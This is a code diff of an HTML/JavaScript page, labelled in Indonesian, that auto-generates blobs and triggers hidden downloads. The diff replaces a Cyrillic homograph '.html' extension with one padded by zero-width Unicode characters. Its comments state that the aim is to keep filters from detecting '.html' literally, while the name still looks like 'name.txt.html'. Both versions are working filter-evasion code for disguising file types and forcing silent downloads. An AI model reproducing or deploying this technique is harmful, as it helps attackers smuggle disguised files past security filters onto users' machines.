@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Full Homograph Bypass</title>
+<title>Invisible Character Bypass</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -22,8 +22,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Full Homograph Bypass</h2>
-<p>Menyamarkan ekstensi .html menggunakan karakter Unicode (Homograph).</p>
+<h2>Invisible Character Bypass</h2>
+<p>Menyamarkan ekstensi .html dengan menyisipkan Zero-Width Character.</p>
 
 <button id="start-btn" type="button">Mulai Generate Blob</button>
 <div id="status" role="status">Sistem siap.</div>
@@ -48,18 +48,16 @@ const speak = (message) => {
     }
 };
 
-// Fungsi untuk membuat nama file Homograph (Full)
-function generateHomographFilename(baseName) {
-    // Karakter yang mirip:
-    // h -> U+04BB (Cyrillic Small Letter Shha)
-    // t -> U+0442 (Cyrillic Small Letter Te)
-    // m -> U+043C (Cyrillic Small Letter Em)
-    // l -> U+04CF (Cyrillic Small Letter Palochka)
+// Fungsi untuk menyisipkan Invisible Character
+function generateInvisibleFilename(baseName) {
+    // Zero-Width Space (U+200B) dan Zero-Width Non-Joiner (U+200C)
+    const zwsp = "\u200B"; 
+    const zwnj = "\u200C";
     
-    const fakeHtml = ".\u04BB\u0442\u043C\u04CF"; // .htm l (mirip .html)
-    
-    // Format: namafile.txt.html-palsu
-    return `${baseName}.txt${fakeHtml}`;
+    // Nama file: nama_asli.txt[ZWS].html[ZWNJ]
+    // Tujuannya agar filter tidak mendeteksi ".html" secara literal
+    // Visualnya: nama_asli.txt.html
+    return `${baseName}.txt${zwsp}.html${zwnj}`;
 }
 
 const prepareMimeBlobAsync = (i) => {
@@ -144,10 +142,10 @@ const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
     
-    // Terapkan Homograph Filename
-    link.download = generateHomographFilename(`laporan-${fileData.id}`);
+    // Terapkan Invisible Filename
+    link.download = generateInvisibleFilename(`laporan-${fileData.id}`);
     
-    link.textContent = `Blob #${fileData.id} (Full Homograph)`;
+    link.textContent = `Blob #${fileData.id} (Invisible)`;
     link.style.display = "none";
     downloadsDiv.appendChild(link);
     link.click();
